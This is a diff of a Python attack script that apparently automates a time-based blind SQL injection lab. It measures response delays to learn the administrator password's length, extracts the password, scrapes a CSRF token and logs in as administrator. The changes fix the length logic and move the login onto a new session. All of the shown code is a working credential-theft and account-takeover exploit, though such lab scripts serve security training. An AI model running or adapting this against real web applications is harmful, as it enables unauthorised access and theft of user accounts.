@@ -60,14 +60,14 @@ while True:
     end = time.time()
 
     delay = end - start
-
     if delay > 4.5:
-        password_length = i
         print(f"[+] Password is longer than {i}")
         i += 1
     else:
+        password_length = i
         print(f"[!] Password length is {i}")
         break
+    
 
 # Step 3: Extract password using time-based delay (not error-based)
 print("[*] Extracting password...")
@@ -109,12 +109,16 @@ print(f"\n[+] Extracted password: {extracted_password}")
 print("Now lets login as admin, but firstly find csrf token")
 
 
-res= session.get(app_url+"login",verify=False,proxies=proxies)
+# Create session
+admin = requests.Session()
+
+
+res= admin.get(app_url+"/login",verify=False,proxies=proxies)
 token_pattern = re.search(r'name="csrf" value="(.+?)"',res.text)  # way to find csrf token
 ftoken = token_pattern.group(1)
 print("CSRF token is", ftoken)
 
 
 a_data = {'username':'administrator','password':extracted_password,'csrf':ftoken}
-a_res = session.post(app_url+"/login",verify=False,proxies=proxies,data=a_data)
+a_res = admin.post(app_url+"/login",verify=False,proxies=proxies,data=a_data)
 print("session for admin is", session.cookies.get_dict())
